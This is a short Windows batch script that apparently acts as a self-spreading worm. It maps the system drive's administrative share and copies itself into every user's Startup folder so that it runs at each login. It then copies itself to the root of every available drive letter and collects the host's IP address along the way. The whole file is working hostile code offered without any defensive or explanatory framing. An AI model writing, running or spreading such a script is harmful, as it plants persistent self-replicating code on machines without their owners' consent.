@echo off
::<<Setup>>
for /f %%a in ('echo %HOMEDRIVE:~0,-1%') do set hd=%%a
for /f %%d in ('echo %SYSTEMDRIVE:~0,-1%') do set sd=%%d
for /f "delims=[] tokens=2" %%b in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set IP=%%b



net use J: \\%computername%\%sd%$



if exist J: (for /f %%u in ('dir J:\Users /b') do copy %0 "J:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo %%u
mountvol J: /d
)

for %%f in ( a b d e f g h i j k l m n o p q r s t u v w x y z) do (
if exist %%f: ( 
copy %0 %%f:\
)
)
echo hd %hd%
echo sd %sd%
echo IP %IP%
net use * /del


